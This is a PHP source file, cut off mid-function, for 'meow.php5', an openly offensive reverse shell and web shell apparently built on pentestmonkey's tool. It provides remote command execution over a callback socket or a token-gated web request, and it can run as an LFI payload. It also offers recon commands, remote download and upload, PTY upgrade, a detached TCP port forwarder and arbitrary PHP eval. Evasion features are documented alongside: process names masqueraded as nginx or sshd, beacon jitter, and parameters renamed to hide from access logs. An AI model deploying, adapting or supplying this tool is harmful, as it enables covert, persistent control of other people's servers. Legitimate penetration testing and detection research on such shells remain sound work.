<?php
/**
 * ============================================================================
 *  meow.php5 -- Interactive PHP reverse shell & web shell
 *  Enhanced edition, single file, zero dependencies.
 *
 *  Based on pentestmonkey's php-reverse-shell (GPLv2), rewritten as a
 *  session-oriented shell with a command loop, file transfer, PTY upgrade,
 *  transient port forwarding and capability reporting.
 *
 *  ---------------------------------------------------------------------------
 *  BLENDING IN (what this file does)
 *  ---------------------------------------------------------------------------
 *  Process-title masquerade so `ps` shows something you chose instead of the
 *  interpreter. Beacon jitter on the callback so a fixed-interval detector
 *  sees noise instead of a metronome. Web mode suppresses its own warnings,
 *  does not echo the shell's name, and lets you rename the request parameters
 *  so a URL does not read like a webshell. All of it is tradecraft that makes
 *  the shell harder to FIND.
 *
 *  ---------------------------------------------------------------------------
 *  WHAT IS DELIBERATELY *NOT* IN HERE
 *  ---------------------------------------------------------------------------
 *  No source-code obfuscation, packing, or polymorphism to defeat signatures.
 *  No timestomping. No reading, rewriting, or truncating the host's log files.
 *  No disabling or subverting the host's AV/EDR/syslog.
 *  No self-replication, no spray, no scanning, no worming.
 *  No browser-credential harvesting.
 *  No local privilege-escalation exploits.
 *
 *  The line: features that make you hard to FIND are in; features that make
 *  you hard to PROVE -- falsified times, a destroyed audit trail, a blinded
 *  sensor -- are not. A tester who leaves the client unable to reconstruct
 *  the incident has broken the engagement, not won it. !cleanup exists so the
 *  box is left as you found it.
 *
 *  ---------------------------------------------------------------------------
 *  USAGE
 *  ---------------------------------------------------------------------------
 *  Reverse shell (from a CLI):
 *      php meow.php5 [host] [port] [token] \
 *          [--tls|--no-tls] [--no-retry] [--no-pty] \
 *          [--timeout=<secs>] [--delay=<secs>]
 *
 *  Every setting can also come from MEOW_<KEY> in the environment, which is
 *  how you get a config into the file without editing it:
 *      MEOW_HOST=1.2.3.4 MEOW_PORT=443 MEOW_TOKEN=... php meow.php5 --tls
 *
 *  Web shell (from a web request to the file itself):
 *      https://host/meow.php5?k=<token>              -> prints usage/help
 *      https://host/meow.php5?k=<token>&cb=<b64cmd>   -> runs base64 command
 *      POST cb=<b64cmd> also works, and is preferable.
 *
 *  Included rather than hit directly:
 *      The file has no side effects when `include`d. All functions become
 *      available to the including application, so it composes with an LFI/RCE
 *      primitive you already have instead of blindly writing to its output.
 *
 *      To have it act anyway (e.g. as an LFI payload for a page that lets you
 *      control the query string), append the include trigger to that page's
 *      URL -- `?meow=run` by default -- or set MEOW_RUN_ON_INCLUDE=1.
 *
 *  ---------------------------------------------------------------------------
 *  SESSION GRAMMAR
 *  ---------------------------------------------------------------------------
 *  Any line that does not start with "!" is handed to the shell, verbatim, so
 *  pipes, redirection, quoting and job control all behave normally.
 *
 *  "!" introduces a built-in. A command that begins with "!" but is not one is
 *  still reachable: "!!<cmd>" delivers it with the '!' escaped for the shell,
 *  so `!` never falls through to builtin dispatch.
 *
 *      !help                  this list
 *      !info                  host + PHP capability report
 *      !perm                  disabled functions / open_basedir / primitives
 *      !cd <dir>              change working directory
 *      !pwd                   print working directory
 *      !ls [dir]              long listing
 *      !cat <file>            print a file
 *      !download <url> [path] pull a remote file onto this host
 *      !upload <path>         send base64 on following lines, "." to finish
 *      !upgrade               replace the session with an interactive PTY
 *      !fwd [--all] <lport> <rhost> <rport>
 *                             background TCP forwarder
 *      !env                   environment
 *      !php <code>            evaluate PHP in this process
 *      !cleanup [--self]      unlink files this shell wrote, kill its own
 *                             port forwards, and report what it did
 *      !selfdestruct          delete this file and exit
 *      !exit                  close the session
 *
 *  ---------------------------------------------------------------------------
 *  BLENDING IN -- how to turn it on
 *  ---------------------------------------------------------------------------
 *      php meow.php5 host 443 token --tls --alias=nginx --jitter=0.6
 *
 *  --alias=<name>   renames this process via cli_set_process_title(). Linux
 *                   truncates to 15 characters (TASK_COMM_LEN), so keep it
 *                   short. Common choices: nginx, apache2, kworker, sshd.
 *  --jitter=<0..1>  randomises each callback delay by +/- this fraction, so a
 *                   fixed-interval beacon detector sees noise. 0 = metronome.
 *
 *  Web-mode parameter names are 'sid' and 'upd' by default; change 'web_key'
 *  and 'web_b64' in the config array below so the request does not announce
 *  itself as a webshell to anyone reading access logs.
 *
 *  ---------------------------------------------------------------------------
 *  RELIABILITY NOTES
 *  ---------------------------------------------------------------------------
 *  * Auth token is never sent in the clear; the listener receives SHA-256.
 *  * Exponential-ish reconnect so a listener restart does not lose the shell.
 *  * Optional TLS so the shell is not plaintext on the wire.
 *  * Graceful degradation when proc_open / stream_select / pcntl are absent.
 *  * Every side effect is tracked so !cleanup can revert it.
 * ============================================================================
 */

/* ========================================================================== *
 *  CONFIG                                                                     *
 * ========================================================================== */

if (!isset($GLOBALS['meow']) || !is_array($GLOBALS['meow'])) {
    $GLOBALS['meow'] = [];
}

function meow_cfg(array $defaults): array
{
    $cfg = $defaults;
    $argv = isset($GLOBALS['argv']) ? (array)$GLOBALS['argv'] : [];

    // positional: host port token
    // Flags never count as positionals, or `meow.php5 host port --tls` would
    // silently set the token to "--tls".
    foreach (['host' => 1, 'port' => 2, 'token' => 3] as $key => $idx) {
        $v = $argv[$idx] ?? null;
        if (is_string($v) && $v !== '' && strncmp($v, '-', 1) !== 0) {
            $cfg[$key] = $v;
        }
    }
    // flags
    if (in_array('--tls', $argv, true))      { $cfg['tls']     = true; }
    if (in_array('--no-tls', $argv, true))   { $cfg['tls']     = false; }
    if (in_array('--no-retry', $argv, true)) { $cfg['retry']   = false; }
    if (in_array('--no-pty', $argv, true))   { $cfg['pty']     = false; }
    if (in_array('--quiet', $argv, true))    { $cfg['quiet']   = true; }
    foreach ($argv as $a) {
        if (!is_string($a)) { continue; }
        if (preg_match('/^--timeout=(\d+)$/', $a, $m)) {
            $cfg['exec_timeout'] = max(0, (int)$m[1]);
        }
        if (preg_match('/^--delay=(\d+)$/', $a, $m)) {
            $cfg['retry_delay'] = max(1, (int)$m[1]);
        }
        if (preg_match('/^--alias=(\S+)$/', $a, $m)) {
            $cfg['proc_alias'] = $m[1];
        }
        if (preg_match('/^--jitter=(\d+(?:\.\d+)?)$/', $a, $m)) {
            $cfg['jitter'] = min(1.0, max(0.0, (float)$m[1]));
        }
    }

    // environment overrides, handy for a dropper wrapper
    foreach ($cfg as $k => $v) {
        $env = getenv('MEOW_' . strtoupper($k));
        if ($env !== false && $env !== '') {
            $cfg[$k] = ($v === true || $v === false) ? ($env !== '0') : $env;
        }
    }

    return $GLOBALS['meow'] = $cfg;
}

/* ========================================================================== *
 *  LOW-LEVEL UTILITIES                                                        *
 * ========================================================================== */

/** Write to the client socket. Never fatal. */
function meow_out($sock, string $s): void
{
    if ($s === '') {
        return;
    }
    if (is_resource($sock)) {
        @fwrite($sock, $s);
    }
}

/** Normalise arbitrary bytes to UTF-8 so the listener never chokes. */
function meow_utf8(string $s): string
{
    if ($s === '') {
        return '';
    }
    if (function_exists('mb_convert_encoding')) {
        $c = @mb_convert_encoding($s, 'UTF-8', 'UTF-8, ISO-8859-1, Windows-1252, CP437');
        if ($c !== false) {
            return $c;
        }
    }
    return $s;
}

function meow_windows(): bool
{
    if (defined('PHP_OS_FAMILY')) {
        return PHP_OS_FAMILY === 'Windows';
    }
    return strncasecmp(PHP_OS, 'WIN', 3) === 0;
}

/** True when we are answering an HTTP request rather than a CLI process. */
function meow_http(): bool
{
    $sapi = PHP_SAPI;
    return $sapi !== 'cli' && $sapi !== 'phpdbg' && $sapi !== 'embed';
}

/**
 * True only when this file is the entry point (not merely included).
 *
 * Without this, `require 'meow.php5'` from a wrapper script would start a
 * reverse shell as a side effect of the include, which is the opposite of
 * composable. The opt-in escape hatch lives in the entry block below.
 */
function meow_entry(): bool
{
    $sf = isset($_SERVER['SCRIPT_FILENAME']) ? (string)$_SERVER['SCRIPT_FILENAME'] : '';

    // No SCRIPT_FILENAME at all means `php -r`, `php -R` or piped stdin:
    // an eval, never a file the operator invoked. HTTP still sets it in every
    // real SAPI (php-fpm, mod_php, the dev server), so an empty value there
    // is treated as a direct request rather than an include.
    if ($sf === '') {
        return meow_http();
    }

    if ($sf === __FILE__) {
        return true;
    }
    $rp = @realpath($sf);
    return $rp !== false && $rp === __FILE__;
}

/** Constant-time token comparison. */
function meow_token_ok(string $given, string $want): bool
{
    if ($want === '') {
        return true;
    }
    if (function_exists('hash_equals')) {
        return hash_equals($want, $given);
    }
    return $given === $want;
}

/* -------------------------------------------------------------------------- *
 *  Working directory                                                          *
 * -------------------------------------------------------------------------- */

function meow_cwd(): string
{
    global $meowCwd;
    if (isset($meowCwd) && is_string($meowCwd) && is_dir($meowCwd)) {
        return $meowCwd;
    }
    $c = @getcwd();
    if ($c === false || $c === '') {
        $c = meow_windows() ? 'C:\\' : '/';
    }
    return $meowCwd = $c;
}

/* -------------------------------------------------------------------------- *
 *  What can we actually execute?                                              *
 * -------------------------------------------------------------------------- */

function meow_caps(): array
{
    static $cache = null;
    if (is_array($cache)) {
        return $cache;
    }
    $raw = (string)ini_get('disable_functions');
    $disabled = [];
    if ($raw !== '') {
        foreach (explode(',', $raw) as $f) {
            $f = trim($f);
            if ($f !== '') {
                $disabled[$f] = true;
            }
        }
    }
    $out = [];
    foreach (['proc_open', 'shell_exec', 'passthru', 'system', 'exec', 'popen'] as $f) {
        if (function_exists($f) && !isset($disabled[$f])) {
            $out[] = $f;
        }
    }
    return $cache = $out;
}

/**
 * Execute a command through the best primitive we have and capture everything.
 * Returns [output, exit_code]. Mirrors stderr into stdout.
 *
 * Set $redirect = false when $cmd already carries its own redirection.
 */
function meow_raw_exec(string $cmd, bool $redirect = true): array
{
    $caps = meow_caps();
    $full = $redirect ? $cmd . ' 2>&1' : $cmd;

    if (in_array('proc_open', $caps, true)) {
        $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $p = @proc_open($full, $desc, $pipes, meow_cwd());
        if (is_resource($p)) {
            $out = '';
            if (is_resource($pipes[1])) { $out .= (string)stream_get_contents($pipes[1]); fclose($pipes[1]); }
            if (is_resource($pipes[2])) { $err = (string)stream_get_contents($pipes[2]); fclose($pipes[2]); if ($err !== '') { $out .= $err; } }
            $code = (int)proc_close($p);
            return [meow_utf8($out), $code];
        }
    }

    if (in_array('shell_exec', $caps, true)) {
        $o = @shell_exec($full);
        return [meow_utf8((string)$o), 0];
    }

    if (in_array('passthru', $caps, true)) {
        $code = 0;
        ob_start();
        @passthru($full, $code);
        $o = ob_get_clean();
        return [meow_utf8((string)$o), (int)$code];
    }

    if (in_array('system', $caps, true)) {
        $code = 0;
        ob_start();
        @system($full, $code);
        $o = ob_get_clean();
        return [meow_utf8((string)$o), (int)$code];
    }

    if (in_array('exec', $caps, true)) {
        $lines = [];
        $code = 0;
        @exec($full, $lines, $code);
        $o = count($lines) ? implode("\n", $lines) . "\n" : '';
        return [meow_utf8($o), (int)$code];
    }

    if (in_array('popen', $caps, true)) {
        $h = @popen($full, 'r');
        if ($h !== false && is_resource($h)) {
            $o = (string)stream_get_contents($h);
            pclose($h);
            return [meow_utf8($o), 0];
        }
    }

    return ["[!] no usable command primitive (disable_functions?)\n", 1];
}

/** Does a binary exist on PATH? */
function meow_has(string $bin): bool
{
    static $cache = [];
    if (array_key_exists($bin, $cache)) {
        return $cache[$bin];
    }
    if (meow_windows()) {
        return $cache[$bin] = false;
    }
    $r = meow_raw_exec('command -v ' . escapeshellarg($bin));
    return $cache[$bin] = (trim((string)$r[0]) !== '');
}

/** A POSIX shell we can hand a command string to. */
function meow_posix_sh(): string
{
    foreach (['/bin/sh', '/usr/bin/sh', '/bin/bash', '/usr/bin/bash'] as $s) {
        if (@is_executable($s)) {
            return $s;
        }
    }
    return '/bin/sh';
}

/**
 * Execute with a wall-clock cap so a hung command cannot wedge the session.
 *
 * The timeout is applied *inside* a nested shell. Putting it outside would turn
 * `timeout ... exit 7` into an attempt to exec a binary called `exit`, which
 * silently breaks every shell builtin (exit, cd, export, ...).
 */
function meow_exec(string $cmd, ?int $timeout = null): array
{
    $cmd = trim($cmd);
    if ($cmd === '') {
        return ['', 0];
    }
    if ($timeout === null) {
        $timeout = (int)$GLOBALS['meow']['exec_timeout'];
    }

    if (!meow_windows() && $timeout > 0 && meow_has('timeout')) {
        $inner = $cmd . ' 2>&1';
        $cmd = 'timeout -k 2 ' . $timeout . ' ' . meow_posix_sh() . ' -c '
             . escapeshellarg($inner);
        return meow_raw_exec($cmd, false);
    }

    return meow_raw_exec($cmd);
}

/* ========================================================================== *
 *  PROMPT / BANNER                                                            *
 * ========================================================================== */

function meow_ident(): array
{
    $user = getenv('USER') ?: getenv('USERNAME');
    if (!$user) { $user = 'user'; }
    $host = getenv('HOSTNAME') ?: getenv('COMPUTERNAME');
    if (!$host && function_exists('gethostname')) {
        $h = @gethostname();
        if ($h) { $host = $h; }
    }
    if (!$host) { $host = 'unknown'; }
    return [$user, $host];
}

function meow_prompt(): string
{
    [$u, $h] = meow_ident();
    $dir = basename(meow_cwd());
    if ($dir === '') { $dir = '/'; }
    return sprintf("\033[1;35m%s@%s\033[0m:\033[1;34m%s\033[0m$ ", $u, $h, $dir);
}

function meow_banner(): string
{
    global $meow;
    [$u, $h] = meow_ident();
    $line = str_repeat('-', 68);
    return sprintf(
        "\033[1;32m%s\n  meow.php5 v%s  |  %s@%s  |  php %s  |  sapi %s\n%s\033[0m\n",
        $line,
        $meow['version'] ?? '?',
        $u,
        $h,
        PHP_VERSION,
        PHP_SAPI,
        $line
    );
}

/* ========================================================================== *
 *  RECON                                                                     *
 * ========================================================================== */

function meow_info(): string
{
    $out = "--- host ------------------------------------------------\n";

    if (meow_windows()) {
        $cmds = ['whoami', 'hostname', 'ver', 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"'];
    } else {
        $cmds = [
            'id -a',
            'uname -a',
            'hostname',
            'cat /etc/os-release 2>/dev/null | head -6',
            'ip -brief address 2>/dev/null || ip addr 2>/dev/null || ifconfig 2>/dev/null',
            'ls -la ' . escapeshellarg(meow_cwd()),
        ];
    }
    foreach ($cmds as $c) {
        [$o, ] = meow_exec($c, 15);
        $out .= $o . "\n";
    }

    $out .= "--- php -------------------------------------------------\n";
    $out .= 'version   : ' . PHP_VERSION . "\n";
    $out .= 'sapi      : ' . PHP_SAPI . "\n";
    $out .= 'os        : ' . PHP_OS . "\n";
    $out .= 'user      : ' . (function_exists('posix_getpwuid') && function_exists('posix_geteuid')
            ? (@posix_getpwuid(@posix_geteuid())['name'] ?? '?') : 'unknown') . "\n";
    $out .= 'cwd       : ' . meow_cwd() . "\n";
    $out .= 'self      : ' . __FILE__ . "\n";
    $out .= 'caps      : ' . (implode(', ', meow_caps()) ?: '(none)') . "\n";

    $df = (string)ini_get('disable_functions');
    $out .= 'disabled  : ' . ($df === '' ? '(none)' : $df) . "\n";
    $ob = (string)ini_get('open_basedir');
    $out .= 'basedir   : ' . ($ob === '' ? '(none)' : $ob) . "\n";
    $out .= 'fopen_url : ' . (ini_get('allow_url_fopen') ?: '0') . "\n";
    $out .= 'pcntl     : ' . (function_exists('pcntl_fork') ? 'yes' : 'no') . "\n";
    $out .= 'posix     : ' . (function_exists('posix_setsid') ? 'yes' : 'no') . "\n";
    $out .= 'curl      : ' . (function_exists('curl_init') ? 'yes' : 'no') . "\n";

    return $out;
}

function meow_perm_report(): string
{
    $caps = meow_caps();
    $out = "exec primitives : " . (implode(', ', $caps) ?: '(none)') . "\n";
    foreach (['proc_open', 'shell_exec', 'passthru', 'system', 'exec', 'popen'] as $f) {
        $out .= sprintf("  %-12s %s\n", $f, in_array($f, $caps, true) ? 'OK' : 'BLOCKED');
    }
    $df = (string)ini_get('disable_functions');
    $out .= "disable_functions : " . ($df === '' ? '(none)' : $df) . "\n";
    $ob = (string)ini_get('open_basedir');
    $out .= "open_basedir      : " . ($ob === '' ? '(none)' : $ob) . "\n";
    $out .= "safe_mode         : removed in 5.4, always off\n";
    return $out;
}

/* ========================================================================== *
 *  FETCH                                                                     *
 * ========================================================================== */

function meow_fetch(string $url): ?string
{
    if (filter_var($url, FILTER_VALIDATE_URL) === false && strpos($url, 'http') !== 0) {
        return null;
    }

    if ((string)ini_get('allow_url_fopen') === '1' || (string)ini_get('allow_url_fopen') === 'On') {
        $ctx = stream_context_create([
            'http' => ['timeout' => 30, 'follow_location' => 1, 'max_redirects' => 5,
                       'header' => "User-Agent: meow/2\r\n"],
            'https' => ['timeout' => 30, 'follow_location' => 1,
                        'verify_peer' => false, 'verify_peer_name' => false,
                        'allow_self_signed' => true],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true],
        ]);
        $d = @file_get_contents($url, false, $ctx);
        if ($d !== false) {
            return (string)$d;
        }
    }

    if (function_exists('curl_init')) {
        $c = curl_init($url);
        if ($c !== false) {
            curl_setopt_array($c, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_MAXREDIRS      => 5,
                CURLOPT_TIMEOUT        => 30,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_USERAGENT      => 'meow/2',
            ]);
            $d = curl_exec($c);
            curl_close($c);
            if ($d !== false) {
                return (string)$d;
            }
        }
    }

    foreach (['curl', 'wget'] as $bin) {
        if (meow_has($bin)) {
            $tmp = tempnam(sys_get_temp_dir(), 'mw');
            if ($tmp === false) { continue; }
            $cmd = $bin === 'curl'
                ? 'curl -ksSL -o ' . escapeshellarg($tmp) . ' ' . escapeshellarg($url)
                : 'wget -q -O ' . escapeshellarg($tmp) . ' ' . escapeshellarg($url);
            meow_raw_exec($cmd);
            $d = @file_get_contents($tmp);
            @unlink($tmp);
            if ($d !== false && $d !== '') {
                return (string)$d;
            }
        }
    }

    return null;
}

/* ========================================================================== *
 *  PTY                                                                       *
 * ========================================================================== */

function meow_pick_shell(): string
{
    if (meow_windows()) {
        return 'cmd.exe';
    }
    foreach (['/bin/bash', '/usr/bin/bash', '/bin/zsh', '/usr/local/bin/bash',
              '/bin/sh', '/usr/bin/sh', '/bin/dash'] as $s) {
        if (@is_executable($s)) {
            return $s;
        }
    }
    return 'sh';
}

/**
 * Prefer a real PTY so full-screen programs, sudo prompts, arrow keys and
 * tab-completion all work. Falls back through script -> python pty -> plain.
 */
function meow_pty_command(): string
{
    if (meow_windows()) {
        return 'cmd.exe';
    }
    $sh = meow_pick_shell();

    if (meow_has('script')) {
        return 'script -qfc ' . escapeshellarg($sh) . ' /dev/null';
    }
    foreach (['python3', 'python'] as $py) {
        if (meow_has($py)) {
            return $py . ' -c ' . escapeshellarg("import pty; pty.spawn(" . var_export($sh, true) . ")");
        }
    }
    return $sh . ' -i';
}

function meow_pty_close($in, $out, $err, $proc): void
{
    foreach ([$in, $out, $err] as $h) {
        if (is_resource($h)) { @fclose($h); }
    }
    if (is_resource($proc)) {
        @proc_terminate($proc);
        @proc_close($proc);
    }
}

/**
 * Multiplexed PTY session. Everything not prefixed with "!" is forwarded
 * byte-for-byte, so terminal control sequences pass straight through.
 */
function meow_pty_session($sock): void
{
    if (meow_windows()) {
        meow_out($sock, "[-] PTY upgrade unavailable on Windows\n");
        return;
    }

    $cmd  = meow_pty_command();
    $desc = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $proc = @proc_open($cmd, $desc, $p, meow_cwd());

    if (!is_resource($proc)) {
        meow_out($sock, "[-] could not spawn a shell process\n");
        return;
    }

    $cin  = $p[0] ?? null;
    $cout = $p[1] ?? null;
    $cerr = $p[2] ?? null;

    @stream_set_blocking($sock, false);
    if (is_resource($cin))  { @stream_set_blocking($cin,  false); }
    if (is_resource($cout)) { @stream_set_blocking($cout, false); }
    if (is_resource($cerr)) { @stream_set_blocking($cerr, false); }

    meow_out($sock, "\033[1;32m[+] PTY shell: " . $cmd . "\033[0m\r\n");
    // Give the listener's terminal a sane baseline size.
    meow_out($sock, "\033[8;40;120t");

    $pending = '';   // bytes not yet written to the child
    $buf     = '';   // partial line from the client
    $outEof  = false;
    $errEof  = false;
    $done    = false;

    while (!$done) {
        $r = [];
        if (is_resource($sock))                    { $r[] = $sock; }
        if (!$outEof && is_resource($cout))        { $r[] = $cout; }
        if (!$errEof && is_resource($cerr))        { $r[] = $cerr; }
        if (empty($r)) { break; }

        $w = ($pending !== '' && is_resource($cin) && !@feof($cin)) ? [$cin] : [];

        $x = null;
        $n = @stream_select($r, $w, $x, 5);
        if ($n === false) { usleep(100000); continue; }
        if ($n === 0) { continue; }

        /* --- drain anything we owe the child ---------------------------- */
        foreach ($w as $h) {
            $written = @fwrite($h, $pending);
            if ($written === false || $written === 0) { $done = true; break; }
            $pending = (string)substr($pending, $written);
        }
        if ($done) { break; }

        /* --- service readable streams ---------------------------------- */
        foreach ($r as $h) {
            $d = @fread($h, 16384);
            if ($d === false) { continue; }

            if ($d === '') {                       // EOF
                if ($h === $sock) { $done = true; break; }
                if ($h === $cout) { $outEof = true; if (is_resource($cout)) { @fclose($cout); } }
                if ($h === $cerr) { $errEof = true; if (is_resource($cerr)) { @fclose($cerr); } }
                if ($outEof && $errEof) { $done = true; break; }
                continue;
            }

            if ($h === $sock) {
                $buf .= $d;
                while (($nl = strpos($buf, "\n")) !== false) {
                    $raw  = substr($buf, 0, $nl + 1);
                    $buf  = substr($buf, $nl + 1);
                    $text = rtrim($raw, "\r\n");

                    if ($text !== '' && $text[0] === '!') {
                        if (substr($text, 0, 2) === '!!') {
                            // Neutralise the shell's pipeline-negation operator
                            // so '!' lands as a literal command name.
                            // `\!foo` is how you say that to a POSIX shell.
                            $raw = '\\' . substr($raw, 1);
                        } else {
                            $act = meow_builtin($sock, $text);
                            if ($act === 'exit') {
                                meow_pty_close($cin, $cout, $cerr, $proc);
                                if (is_resource($sock)) { @stream_set_blocking($sock, true); }
                                return;
                            }
                            if ($act === 'upgrade') {
                                meow_out($sock, "[!] already inside a PTY\n");
                            }
                            continue;
                        }
                    }
                    $pending .= $raw;
                }
            } else {
                meow_out($sock, $d);
            }
        }
    }

    meow_pty_close($cin, $cout, $cerr, $proc);
    if (is_resource($sock)) {
        @stream_set_blocking($sock, true);
        meow_out($sock, "[*] shell ended\n");
    }
}

/* ========================================================================== *
 *  PORT FORWARDING                                                           *
 * ========================================================================== */

function meow_pump($a, $b): void
{
    @stream_set_blocking($a, false);
    @stream_set_blocking($b, false);
    while (true) {
        $r = [$a, $b];
        $w = null;
        $x = null;
        $n = @stream_select($r, $w, $x, null);
        if ($n === false || $n === 0) { usleep(20000); continue; }
        foreach ($r as $h) {
            $d = @fread($h, 16384);
            if ($d === false) { continue; }
            if ($d === '')   { return; }
            if ($h === $a) { @fwrite($b, $d); } else { @fwrite($a, $d); }
        }
    }
}

/** Fork a detached listener. Loopback-bound unless --all is given. */
function meow_forward($sock, string $bind, int $lport, string $rhost, int $rport): void
{
    if (!function_exists('pcntl_fork')) {
        meow_out($sock, "[!] pcntl unavailable; cannot fork a forwarder\n");
        return;
    }

    $pid = @pcntl_fork();
    if ($pid === -1) {
        meow_out($sock, "[!] fork failed\n");
        return;
    }
    if ($pid > 0) {
        meow_note(['fwd', $pid, $bind, $lport, $rhost, $rport]);
        meow_out($sock, sprintf("[+] %s:%d -> %s:%d (pid %d)\n", $bind, $lport, $rhost, $rport, $pid));
        return;
    }

    /* ---- child: fully detached relay ----------------------------------- */
    if (function_exists('posix_setsid')) { @posix_setsid(); }
    if (function_exists('pcntl_signal')) {
        @pcntl_signal(SIGCHLD, SIG_IGN);      // auto-reap grandchildren
    }
    if (is_resource($sock)) { @fclose($sock); }
    @fclose(STDOUT);
    @fclose(STDERR);
    error_reporting(0);

    $srv = @stream_socket_server("tcp://{$bind}:{$lport}", $en, $es,
        STREAM_SERVER_BIND | STREAM_SERVER_LISTEN);
    if ($srv === false) {
        exit(1);
    }

    while (true) {
        $cli = @stream_socket_accept($srv, 3600);
        if ($cli === false) { continue; }
        $cpid = @pcntl_fork();
        if ($cpid === 0) {
            if (is_resource($srv)) { @fclose($srv); }
            $rem = @stream_socket_client("tcp://{$rhost}:{$rport}", $e1, $e2, 15);
            if ($rem === false) { @fclose($cli); exit(0); }
            meow_pump($cli, $rem);
            @fclose($cli);
            @fclose($rem);
            exit(0);
        }
        if (is_resource($cli)) { @fclose($cli); }
    }
}

/* ========================================================================== *
 *  BUILT-INS                                                                 *
 * ========================================================================== */

function meow_help($sock): void
{
    meow_out($sock, <<<'TXT'

  meow.php5 -- interactive commands
  ---------------------------------
  <anything>            run in the shell (sh -c). pipes/redirects/builtins all work.
  !!cmd                 '!' becomes literal, bypassing builtin dispatch

  !help                 this list
  !info                 host + PHP capability report
  !perm                 exec primitives, disable_functions, open_basedir
  !cd <dir>             change working directory
  !pwd                  print working directory
  !ls [dir]             long listing
  !cat <file>           print a file
  !catb <file>          print a file as base64 (binary-safe)
  !download <url> [dst] pull a remote file onto this host
  !upload <path>        send base64 on the next lines, "." to finish
  !upgrade              swap to an interactive PTY (vim, sudo, arrows, ...)
  !fwd [--all] <lport> <rhost> <rport>
                        background TCP forwarder; loopback-only by default
  !env                  environment variables
  !php <code>           evaluate PHP in this process
  !cleanup [--self]     unlink files this shell wrote, stop every forward it
                        forked, reset cwd. Only paths it wrote itself.
                        --self also removes this file.
  !selfdestruct         delete this file and exit
  !exit                 close the session

TXT);
}

/**
 * Run a built-in.
 * Returns 'continue' | 'exit' | 'upgrade'
 */
function meow_builtin($sock, string $line): string
{
    $parts = preg_split('/\s+/', trim($line), -1, PREG_SPLIT_NO_EMPTY);
    if (!is_array($parts) || $parts === []) {
        return 'continue';
    }
    $name = strtolower($parts[0]);
    $args = array_slice($parts, 1);

    switch ($name) {

        case '!help':
            meow_help($sock);
            return 'continue';

        case '!exit':
            return 'exit';

        case '!upgrade':
            return 'upgrade';

        case '!info':
            meow_out($sock, meow_info() . "\n");
            return 'continue';

        case '!perm':
            meow_out($sock, meow_perm_report() . "\n");
            return 'continue';

        case '!pwd':
            meow_out($sock, meow_cwd() . "\n");
            return 'continue';

        case '!cd': {
            if (!$args) {
                global $meowCwd;
                $meowCwd = null;
                meow_out($sock, "[~] cwd reset\n");
                return 'continue';
            }
            $target = $args[0];
            if ($target[0] !== '/' && !preg_match('#^[A-Za-z]:#', $target)) {
                $target = rtrim(meow_cwd(), '/') . '/' . $target;
            }
            $real = @realpath($target);
            if ($real !== false && is_dir($real)) {
                global $meowCwd;
                $meowCwd = $real;
                meow_out($sock, "[~] " . $real . "\n");
            } else {
                meow_out($sock, "[-] not a directory: " . $target . "\n");
            }
            return 'continue';
        }

        case '!ls': {
            $dir = $args ? $args[0] : meow_cwd();
            [$o, ] = meow_exec('ls -la ' . escapeshellarg($dir), 15);
            meow_out($sock, $o . "\n");
            return 'continue';
        }

        case '!cat': {
            if (!$args) {
                meow_out($sock, "usage: !cat <file>\n");
                return 'continue';
            }
            $f = $args[0];
            if (!@is_file($f)) {
                meow_out($sock, "[-] not a file: " . $f . "\n");
                return 'continue';
            }
            if (@filesize($f) > 1048576) {
                meow_out($sock, "[!] >1 MiB, use !catb\n");
                return 'continue';
            }
            meow_out($sock, meow_utf8((string)@file_get_contents($f)));
            return 'continue';
        }

        case '!catb': {
            // Binary-safe read: base64 goes on the line, NUL bytes do not.
            if (!$args) {
                meow_out($sock, "usage: !catb <file>\n");
                return 'continue';
            }
            $f = $args[0];
            if (!@is_file($f)) {
                meow_out($sock, "[-] not a file: " . $f . "\n");
                return 'continue';
            }
            $size = @filesize($f);
            if ($size > 10485760) {
                meow_out($sock, "[!] >10 MiB, use !download\n");
                return 'continue';
            }
            $data = @file_get_contents($f);
            if ($data === false) {
                meow_out($sock, "[-] unreadable: " . $f . "\n");
                return 'continue';
            }
            meow_out($sock, sprintf("%s %d\n%s\n", $f, strlen((string)$data),
                                    base64_encode((string)$data)));
            return 'continue';
        }

        case '!download': {
            if (!$args) {
                meow_out($sock, "usage: !download <url> [path]\n");
                return 'continue';
            }
            $url  = $args[0];
            $dest = $args[1] ?? basename((string)parse_url($url, PHP_URL_PATH));
            if ($dest === '' || $dest === false) { $dest = 'download'; }
            $data = meow_fetch($url);
            if ($data === null) {
                meow_out($sock, "[-] fetch failed: " . $url . "\n");
                return 'continue';
            }
            if (@file_put_contents($dest, $data) === false) {
                meow_out($sock, "[-] write failed: " . $dest . "\n");
                return 'continue';
            }
            meow_note(['write', $dest, strlen($data)]);
            meow_out($sock, sprintf("[+] %s -> %s (%d bytes)\n", $url, $dest, strlen($data)));
            return 'continue';
        }

        case '!upload': {
            if (!$args) {
                meow_out($sock, "usage: !upload <path>\n");
                return 'continue';
            }
            $path = $args[0];
            meow_out($sock, "[?] base64 now, end with a line containing only '.'\n");
            $b64 = '';
            while (($l = @fgets($sock, 65536)) !== false) {
                $l = rtrim((string)$l, "\r\n");
                if ($l === '' || $l === '.') { break; }
                $b64 .= $l;
                if (strlen($b64) > 52428800) { break; }     // 50 MiB ceiling
            }
            $data = base64_decode($b64, false);
            if ($data === false) {
                meow_out($sock, "[-] malformed base64\n");
                return 'continue';
            }
            if (@file_put_contents($path, $data) === false) {
                meow_out($sock, "[-] write failed: " . $path . "\n");
                return 'continue';
            }
            meow_note(['write', $path, strlen($data)]);
            meow_out($sock, sprintf("[+] wrote %s (%d bytes)\n", $path, strlen($data)));
            return 'continue';
        }

        case '!fwd': {
            if (isset($args[0]) && ($args[0] === '-a' || $args[0] === '--all')) {
                array_shift($args);
                $bind = '0.0.0.0';
            } else {
                $bind = '127.0.0.1';
            }
            if (count($args) < 3) {
                meow_out($sock, "usage: !fwd [--all] <lport> <rhost> <rport>\n");
                return 'continue';
            }
            $lport = (int)$args[0];
            $rhost = $args[1];
            $rport = (int)$args[2];
            if ($lport < 1 || $lport > 65535 || $rport < 1 || $rport > 65535) {
